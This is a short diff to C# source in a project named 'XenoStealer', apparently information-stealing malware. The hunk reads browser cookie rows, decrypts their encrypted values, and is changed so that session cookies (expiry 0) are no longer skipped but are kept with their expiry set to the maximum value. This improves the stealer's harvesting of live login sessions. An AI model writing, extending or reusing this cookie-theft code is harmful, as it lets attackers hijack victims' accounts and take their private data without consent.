@@ -235,11 +235,14 @@ namespace XenoStealer
                 bool secure = parser.GetValue<int>(i, "is_secure") == 1;
                 bool httpOnly = parser.GetValue<int>(i, "is_httponly") == 1;
 
-                if (domain == null || name == null || path == null || encryptedCookieBuffer == null || expiry == 0) continue;
-                
-        
-                
-        
+                if (domain == null || name == null || path == null || encryptedCookieBuffer == null) continue;
+
+                if (expiry == 0)
+                {
+                    expiry = long.MaxValue;
+                }
+
+
                 string decryptedCookie = decryptor.Decrypt(encryptedCookieBuffer);
                 if (string.IsNullOrEmpty(decryptedCookie))
                 {
